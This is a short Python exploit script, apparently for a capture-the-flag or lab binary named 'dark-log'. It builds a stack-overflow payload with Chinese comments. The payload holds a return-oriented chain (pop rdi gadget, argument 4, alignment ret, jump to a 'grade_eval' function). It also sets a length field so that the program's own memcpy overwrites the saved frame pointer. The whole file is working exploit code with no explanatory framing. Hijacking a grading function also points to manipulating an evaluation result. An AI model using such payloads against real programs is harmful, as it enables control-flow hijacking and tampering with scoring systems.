import sys, struct

q = lambda x: struct.pack("<Q", x)

# 前 128 字节：会被 dark-log 自己的 memcpy 抄到 saved rbp 开始的位置
chain  = b"B" * 8              # 假的 saved rbp（会被 pop rbp 吃掉）
chain += q(0x4018a3)           # pop rdi; ret
chain += q(4)                  # rdi = 4
chain += q(0x4018a4)           # 纯 ret（栈对齐）
chain += q(0x401677)           # grade_eval

payload  = chain.ljust(128, b"C")     # expression 区域
payload += b"D" * 128                 # logMsg 区域
payload += struct.pack("<i", 0xa0)    # f.len = 0xa0 -> memcpy 目标正好落在 saved rbp
payload += b"E" * 4                   # pad

sys.stdout.buffer.write(payload)
